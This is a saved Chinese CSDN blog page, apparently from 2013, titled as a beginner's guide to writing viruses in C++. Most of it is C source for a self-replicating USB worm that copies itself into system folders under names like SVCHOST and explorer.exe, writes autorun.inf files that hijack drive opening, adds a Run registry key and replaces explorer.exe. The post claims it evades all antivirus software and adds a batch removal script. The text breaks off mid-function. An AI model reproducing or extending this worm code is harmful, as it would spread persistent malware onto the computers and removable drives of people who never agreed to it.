@@ -1,0 +1,1110 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0052)http://blog.csdn.net/ghevinn/article/details/8514900 -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><HTML 
+xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=11.0000" 
+http-equiv="X-UA-Compatible">
+     <TITLE>c++编写病毒入门 - ghevinn欢迎您光临         - 博客频道 - CSDN.NET</TITLE>     
+<META http-equiv="Content-Type" content="text/html; charset=utf-8">     
+<META name="description" content="本连载文章只讨论写病毒的技术,并不讨论危害计算机及网络,所示例的程序只是一个无危害的模板,你可以在技术范围及法律范围内扩充实验.在读本程序前请保证不用此程序进行违法活动,否则,请马上离开.连载1——最基本的病毒.本病毒的功能:1.在C、D、E盘和c:\windows\system、c:\windows中生成本病毒体文件2.在C、D、E盘中生成自动运行文件3.注册c:\w"> 
+    
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/jquery.js" type="text/javascript"></SCRIPT>
+     
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/ad.js" type="text/javascript"></SCRIPT>
+         <!--new top-->                <LINK href="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/index.css" 
+rel="stylesheet">         <!--new top-->     <LINK href="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/style.css" 
+rel="Stylesheet" type="text/css">     <LINK title="RSS" id="RSSLink" href="/ghevinn/rss/list" 
+rel="alternate" type="application/rss+xml">     <LINK href="http://csdnimg.cn/public/favicon.ico" 
+rel="shortcut icon">     <LINK href="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/nobg_code.css" 
+rel="stylesheet" type="text/css">  
+<META name="GENERATOR" content="MSHTML 11.00.9600.17126"></HEAD> 
+<BODY><!--new top-->     
+<SCRIPT id="toolbar-tpl-scriptId" src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/html.js" type="text/javascript" skin="black" prod="blog" fixed="true"></SCRIPT>
+      <!--new top-->     
+<DIV id="container">
+<DIV id="header">
+<DIV class="header">
+<DIV id="blog_title">
+<H2><A href="http://blog.csdn.net/ghevinn">ghevinn欢迎您光临</A></H2>
+<H3>只想让自己写的、总结的东西对朋友们有一点点帮助或者启示，就是我最大的欣慰</H3>
+<DIV class="clear"></DIV></DIV>
+<DIV class="clear"></DIV></DIV></DIV>
+<DIV id="navigator">
+<DIV class="navigator_bg"></DIV>
+<DIV class="navigator">
+<UL>
+  <LI id="btnContents"><A 
+  href="http://blog.csdn.net/ghevinn?viewmode=contents"><SPAN onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_mulu'])"><IMG 
+  src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/ico_list.gif">目录视图</SPAN></A></LI> 
+                  
+  <LI id="btnView"><A href="http://blog.csdn.net/ghevinn?viewmode=list"><SPAN 
+  onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_zhaiyao'])"><IMG 
+  src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/ico_summary.gif">摘要视图</SPAN></A></LI> 
+                  
+  <LI id="btnRss"><A href="http://blog.csdn.net/ghevinn/rss/list"><SPAN onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_RSS'])"><IMG 
+  src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/ico_rss.gif">订阅</SPAN></A></LI> 
+              </UL></DIV></DIV>
+<SCRIPT type="text/javascript">
+    var username = "ghevinn";
+    var _blogger = username;
+    var blog_address = "http://blog.csdn.net/ghevinn";
+    var static_host = "http://static.blog.csdn.net";
+    var currentUserName = "";
+</SCRIPT>
+         
+<DIV id="body">
+<DIV id="main">
+<DIV class="main">
+<DIV class="notice tracking-ad" data-mod="popu_3"><A href="http://blog.csdn.net/blogdevteam/article/details/25387451" 
+target="_blank"><FONT color="blue">有奖征资源，博文分享有内涵 </FONT></A> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A href="http://bbs.csdn.net/topics/390824327" 
+target="_blank"><FONT color="red">社区问答：芈峮iOS测试指南 </FONT></A> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A href="http://www.csdn.net/article/2014-06-27/2820432" 
+target="_blank"><FONT color="blue">专访阿里陶辉 </FONT></A> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A href="http://vote.blog.csdn.net/contest/" 
+target="_blank"><FONT color="red">2014 CSDN博文大赛  </FONT></A> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A href="http://blog.csdn.net/blogdevteam/article/details/36176453" 
+target="_blank"><FONT color="blue">10月微软MVP申请 </FONT></A> </DIV><LINK href="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/comment1.css" 
+rel="stylesheet" type="text/css"> <LINK href="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/style1.css" 
+rel="stylesheet" type="text/css"> 
+<SCRIPT language="JavaScript" src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/jquery.cookie.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/main.js" type="text/javascript"></SCRIPT>
+ 
+<DIV class="details" id="article_details">
+<DIV class="article_title"><SPAN class="ico ico_type_Original"></SPAN>     
+<H1><SPAN class="link_title"><A href="http://blog.csdn.net/ghevinn/article/details/8514900"> 
+       c++编写病毒入门         </A></SPAN>     </H1> </DIV>
+<DIV class="article_manage"><SPAN class="link_categories">        分类：            
+ <A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_fenlei']);" 
+href="http://blog.csdn.net/ghevinn/article/category/1296712">c++专区</A>         
+</SPAN>     <SPAN class="link_postdate">2013-01-17 18:40</SPAN>     <SPAN title="阅读次数" 
+class="link_view">902人阅读</SPAN>     <SPAN title="评论次数" class="link_comments"><A 
+onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_pinglun'])" 
+href="http://blog.csdn.net/ghevinn/article/details/8514900#comments">评论</A>(4)</SPAN> 
+    <SPAN class="link_collect"><A title="收藏" onclick="javascript:_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shoucang']);collectArticle('c++编写病毒入门','8514900');return false;" 
+href="javascript:void(0);">收藏</A></SPAN>     <SPAN class="link_report"><A title="举报" 
+onclick="javascript:_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_jubao']);report(8514900,2);return false;" 
+href="http://blog.csdn.net/ghevinn/article/details/8514900#report">举报</A></SPAN> 
+    </DIV>
+<DIV class="article_content" id="article_content">
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">本连载文章只讨论写病毒的技术,并不讨论危害计算机及网络,所示例的程序只是一个无危害的模板,你</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">可以在技术范围及法律范围内扩充实验.<BR>在读本程序前请保证不用此程序进行违法活动,否则,请马上离开.</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">连载1——最基本的病毒.<BR>本病毒的功能:<BR>1.在C、D、E盘和c:\windows\system、c:\windows中生成本病毒体文件<BR>2.在C、D、E盘中生成自动运行文件<BR>3.注册c:\windows\system\svchost.exe，使其开机自动运行<BR>4.在C:\windows\system下生成隐蔽DLL文件<BR>5.病毒在执行后具有相联复制能力</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">本病毒类似普通U盘病毒雏形，具备自我复制、运行能力。</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">以下程序在DEV-CPP 
+4.9.9.2(GCC编译器)下编译通过<BR>请保存为SVCHOST.C编译,运行,本病毒对计算机无危害,请放心研究</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;"><BR>/* 
+SVCHOST.C&nbsp;&nbsp; */<BR>/* SVCHOST.EXE */</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">#define 
+SVCHOST_NUM 6<BR>#include&lt;stdio.h&gt;<BR>#include&lt;string.h&gt;<BR>char 
+*autorun={"[autorun]\nopen=SVCHOST.exe\n\nshell\\1=打开\nshell\\1 
+\\Command=SVCHOST.exe\nshell\\2\\=Open\nshell\\2\\Command=SVCHOST.exe\nshellexecute=SVCHOST.exe"};<BR>
+char 
+*files_autorun[10]={"c:\\autorun.inf","d:\\autorun.inf","e:\\autorun.inf"};<BR>
+char *files_svchost[SVCHOST_NUM+1]={"c:\\windows\\system\\MSMOUSE.DLL",<BR>
+"c:\\windows\\system\\SVCHOST.exe","c:\\windows\\SVCHOST.exe",<BR>
+"c:\\SVCHOST.exe","d:\\SVCHOST.exe","e:\\SVCHOST.exe","SVCHOST.exe"};<BR>char 
+*regadd="reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v 
+SVCHOST /d C:\\Windows\\system\\SVCHOST.exe /f";</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">int copy(char 
+*infile,char *outfile)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp; FILE *input,*output;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; char temp;<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+if(strcmp(infile,outfile)!=0 &amp;&amp; ((input=fopen(infile,"rb"))!=NULL) 
+&amp;&amp; ((output=fopen</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">(outfile,"wb"))!=NULL))<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+while(!feof(input))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fread(&amp;temp,1,1,input);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fwrite(&amp;temp,1,1,output);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(input);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(output);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; else return 1;<BR>}<BR>int main(void)<BR>{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; FILE *input,*output;<BR>&nbsp;&nbsp;&nbsp;&nbsp; int 
+i,k;<BR>&nbsp;&nbsp;&nbsp;&nbsp; for(i=0;i&lt;3;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+output=fopen(files_autorun[i],"w");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fprintf(output,"%s",autorun);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fclose(output);<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+for(i=0;i&lt;=SVCHOST_NUM;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+if((input=fopen(files_svchost[i],"rb"))!=NULL)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(input);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+for(k=0;k&lt;SVCHOST_NUM;k++)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+copy(files_svchost[i],files_svchost[k]);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i=SVCHOST_NUM+1;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; system(regadd); /* 注册SVCHOST.exe,让其在启动时运行 */&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; return 0;<BR>}</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">在连载2中你将看到:<BR>病毒对系统文件破坏的方法，病毒对文件的感染，病毒生成垃圾文件，病毒更具隐蔽性的方法。</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">本连载文章只讨论写病毒的技术,并不讨论危害计算机及网络,所示例的程序只是一个无危害的模板,你可以在技</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">术范围及法律范围内扩充实验.</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">在读本程序前请保证不用此程序进行违法活动,由于你使用本程序而对他人、组织等造成的任何损失都由将你承</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">担，本人不负任何责任，否则,请马上离开.</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">本版病毒所具有的功能：<BR>1.在所有磁盘的根目录生成svchost.com和autorun.inf文件<BR>2.生成病毒体：<BR>c:\windows\wjview32.com<BR>
+c:\windows\explorer.exe<BR>c:\windows\system32\dllcache\explorer.exe<BR>
+c:\windows\system\msmouse.dll<BR>c:\windows\system32\cmdsys.sys<BR>
+c:\windows\system32\mstsc32.exe<BR>
+3.病毒体c:\windows\explorer.exe感染原explorer.exe文件，使其不需要修改注册表做到启动时在</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">explorer.exe前启动<BR>4.修改注册表，在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<BR>设置自启动项（此操作不使用windowsAPI,防止用户对病毒体的发现，并实现并行执行）<BR>5.生成的autorun.inf改变磁盘的打开方式，使其在windows2000以上的系统无论选择“打开”、“双击”、“</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">资源管理器”等方式都无法打开分驱，而是以运行病毒的方式取而代之。<BR>6.连锁能力，将病毒体相连，实现相连复制更新<BR>7.使用进程不断调用进程，使得在任务管理里无法结束病毒进程<BR>8.不断搜索磁盘，只要发现未感染病毒的一律感染，病毒删除后1秒内再建<BR>9.生成垃圾文件（DESTORY_感染_任意数字）5个于C盘下<BR>10.附带删除文件函数（为防止危害，本函数默认不执行）</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">本病毒到目前为止任何杀毒软件都无法将其查杀<BR>
+本病毒单机默认使用对机器无害（破坏代码已屏蔽）<BR>提供病毒卸载程序（保存为X.BAT，双击运行即可卸载）：</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">@echo off<BR>
+echo SK-CHINA SVCHOST KILLER 2007.6<BR>echo WRITE BY S.K<BR>taskkill /im 
+mstsc32.exe /f<BR>del c:\windows\wjview32.com<BR>del c:\windows\explorer.exe<BR>
+del c:\windows\system32\dllcache\explorer.exe<BR>del 
+c:\windows\system\msmouse.dll<BR>del c:\windows\system32\cmdsys.sys<BR>del 
+c:\windows\system32\mstsc32.exe<BR>del c:\svchost.com<BR>del c:\autorun.inf<BR>
+del d:\svchost.com<BR>del d:\autorun.inf<BR>del e:\svchost.com<BR>del 
+e:\autorun.inf<BR>del f:\svchost.com<BR>del f:\autorun.inf<BR>del 
+g:\svchost.com<BR>del g:\autorun.inf<BR>del h:\svchost.com<BR>del 
+h:\autorun.inf<BR>copy c:\windows\system\explorer.exe 
+c:\windows\explorer.exe<BR>copy c:\windows\system\explorer.exe 
+c:\windows\system32\dllcache\explorer.exe<BR>del 
+c:\windows\system\explorer.exe<BR>echo FINISH!<BR>echo 
+如果本次清除后仍残留有病毒，请再次运行本程序<BR>pause</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">--------------------------------------------------------------------<BR>核心代码：（全部代码请从<SPAN 
+style="color: rgb(255, 0, 51);">附件</SPAN>中下载，请用DEV-CPP运行其中的工程文件，编译后请将结果文件svchost.exe更名为svchost.com,否则本病毒无法发挥作用，请安心运行实验，恶意代码已屏蔽）</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;"><BR>/*<BR>
+&nbsp;&nbsp; SK-CHINA<BR>&nbsp;&nbsp; SVCHOST virus WRITE BY S.K<BR>&nbsp;&nbsp; 
+Compiler:<BR>&nbsp;&nbsp; DEV-CPP 4.9.9.2<BR>*/</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">/* 
+SVCHOST.C&nbsp;&nbsp; */<BR>/* SVCHOST.EXE */<BR>/* SVCHOST.COM */<BR>
+#include&lt;stdio.h&gt; /*标准输入输出*/&nbsp;<BR>#include&lt;string.h&gt; 
+/*字符串操作*/&nbsp;<BR>#include&lt;stdlib.h&gt; /*其它函数*/&nbsp;<BR>
+#include&lt;process.h&gt; /*进程控制*/<BR>#include&lt;dir.h&gt; /*目录函数*/</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">#define 
+SVCHOST_NUM 6 /*关键位置病毒复制数量*/<BR>#define RUBBISH_NUM 5 /*垃圾文件数量*/<BR>#define 
+REMOVE_NUM&nbsp;&nbsp; 5 /*删除文件数*/&nbsp;<BR>
+/*====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 文件AUTORUN.INF内容：<BR>&nbsp;&nbsp; 1.自动运行SVCHOST.com<BR>
+&nbsp;&nbsp; 2.覆盖默认打开命令，使用病毒体作为新的打开方式<BR>&nbsp;&nbsp; 
+3.覆盖默认资源管理器命令，使病毒体作为新的命令方式<BR>*/&nbsp;<BR>char 
+*autorun={"[AutoRun]\nopen=\"SVCHOST.com /s\"\nshell\\open=打开(&amp;O)</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">\nshell\\open\\Command=\"SVCHOST.com 
+/s\"\nshell\\explore=资源管理器(&amp;X)</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">\nshell\\explore\\Command=\"SVCHOST.com 
+/s\""};<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 添加注册表项：<BR>&nbsp;&nbsp; 
+1.自动运行生成病毒体C:\windows\wjview32.com<BR>*/<BR>char *regadd={"REGEDIT4\n\n</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"wjview32</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">\"=\"C:\\\\windows\\\\wjview32.com 
+/s\""};<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 函数：复制文件<BR>&nbsp;&nbsp; 复制源：infile<BR>&nbsp;&nbsp; 
+目的地：outfile<BR>&nbsp;&nbsp; 成功返回0，失败返回1<BR>*/&nbsp;<BR>int copy(char 
+*infile,char *outfile)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp; FILE *input,*output;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; char temp;<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+if(strcmp(infile,outfile)!=0 &amp;&amp; ((input=fopen(infile,"rb"))!=NULL) 
+&amp;&amp; ((output=fopen</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">(outfile,"wb"))!=NULL))<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+while(!feof(input))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fread(&amp;temp,1,1,input);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fwrite(&amp;temp,1,1,output);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(input);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(output);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; else return 1;<BR>}<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 函数：通过explorer自动运行&nbsp;<BR>&nbsp;&nbsp; 成功返回0，失败返回1,2<BR>
+*/&nbsp;<BR>int autorun_explorer()<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp; FILE 
+*input;<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+if((input=fopen("c:\\windows\\system\\explorer.exe","rb"))!=NULL)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fclose(input);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+remove("c:\\windows\\$temp$");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+remove("c:\\windows\\system32\\dllcache\\$temp$");<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1;<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; 
+copy("c:\\windows\\explorer.exe","c:\\windows\\system\\explorer.exe");<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; 
+rename("c:\\windows\\explorer.exe","c:\\windows\\$temp$");<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; 
+rename("c:\\windows\\system32\\dllcache\\explorer.exe","c:\\windows\\system32</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;"><A><SPAN style="color: rgb(67, 105, 154);">\\dllcache\\$temp$</SPAN></A>");<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; if(copy("SVCHOST.com","c:\\windows\\explorer.exe")==0 
+&amp;&amp; copy</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">("SVCHOST.com","c:\\windows\\system32\\dllcache\\explorer.exe")==0)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 2;<BR>}<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 函数：添加注册表项&nbsp;<BR>&nbsp;&nbsp; 成功返回0，失败返回1<BR>*/&nbsp;<BR>
+int add_reg()<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp; FILE *output;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; if((output=fopen("$$$$$","w"))!=NULL)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fprintf(output,regadd);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fclose(output);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+spawnl(1,"c:\\windows\\regedit.exe"," /s $$$$$",NULL);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; }<BR>}<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 函数：复制病毒 + Autorun.inf自动运行&nbsp;<BR>*/&nbsp;<BR>void 
+copy_virus()<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp; int i,k;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; FILE *input,*output;<BR>&nbsp;&nbsp;&nbsp;&nbsp; char 
+*files_svchost[SVCHOST_NUM]=</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">{"svchost.com","c:\\windows\\wjview32.com","c:\\windows\\system\\MSMOUSE.DLL","c:\\windows\\syste</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">m32\\cmdsys.sys","c:\\windows\\system32\\mstsc32.exe","c:\\windows\\explorer.exe"};<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; char 
+temp[2][20]={"c:\\svchost.com","c:\\autorun.inf"};<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+for(i=0;i&lt;SVCHOST_NUM;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+if((input=fopen(files_svchost[i],"rb"))!=NULL)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(input);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+for(k=0;k&lt;SVCHOST_NUM;k++)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+copy(files_svchost[i],files_svchost[k]);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i=SVCHOST_NUM;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; for(i=0;i&lt;SVCHOST_NUM;i++)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+if((input=fopen(files_svchost[i],"rb"))!=NULL)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(input);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(k=0;k&lt;24;k++)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+copy(files_svchost[i],temp[0]);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+if((output=fopen(temp[1],"w"))!=NULL)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fprintf(output,"%s",autorun);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fclose(output);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+temp[0][0]++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+temp[1][0]++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i=SVCHOST_NUM;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>}<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 函数：制造垃圾文件&nbsp;<BR>*/&nbsp;<BR>void make_rubbish()<BR>{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; int i;<BR>&nbsp;&nbsp;&nbsp;&nbsp; FILE *output;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; srand(0);<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
